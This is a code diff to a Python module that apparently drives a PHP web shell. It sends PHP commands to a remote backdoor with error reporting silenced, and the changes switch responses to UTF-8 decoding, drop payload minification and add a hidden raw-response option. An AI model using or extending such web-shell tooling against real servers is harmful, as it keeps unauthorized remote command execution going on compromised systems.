@@ -1,11 +1,10 @@
 from mako.template import Template
 from core.module import Module, Status
-from core import messages
 from core.channels.channel import Channel
 from core import config
 from core.loggers import log
+from core.argparsers import SUPPRESS
 import random
-import utils
 
 class Php(Module):
 
@@ -27,6 +26,7 @@ class Php(Module):
           { 'name' : '-prefix-string', 'default' : '@error_reporting(0);' },
           { 'name' : '-post_data' },
           { 'name' : '-postfix-string', 'default' : '' },
+          { 'name' : '-raw-response', 'help' : SUPPRESS, 'action' : 'store_true', 'default' : False },
         ])
 
         self.channel = None
@@ -38,7 +38,7 @@ class Php(Module):
         command = 'echo(%s);' % rand
         response, code, error = channel.send(command)
 
-        if rand == response:
+        if rand == response.decode('utf-8'):
             status = Status.RUN
         else:
             # The PHP shell should never return FAIL
@@ -94,21 +94,12 @@ class Php(Module):
         self.args.update({ 'chdir' : chdir })
         command = Template("""${chdir}${prefix_string}${ ' '.join(command) }${postfix_string}""", strict_undefined=True).render(**self.args)
 
-        # Minify PHP payload.
-        #
-        # In case of error, modify session minify variable and
-        # return original code.
-        if self.session['shell_php']['stored_args'].get('minify', True):
-            minified = utils.code.minify_php(command)
-            self.session['shell_php'][
-                        'stored_args'][
-                        'minify'] = bool(minified)
-            command = minified if minified else command
-
         log.debug('PAYLOAD %s' % command)
 
         # Send command
         response, code, error = self.channel.send(command)
 
-        # Strip last newline if present
-        return response
+        if self.args.get('raw_response'):
+            return response
+        else:
+            return response.decode('utf-8', 'replace')
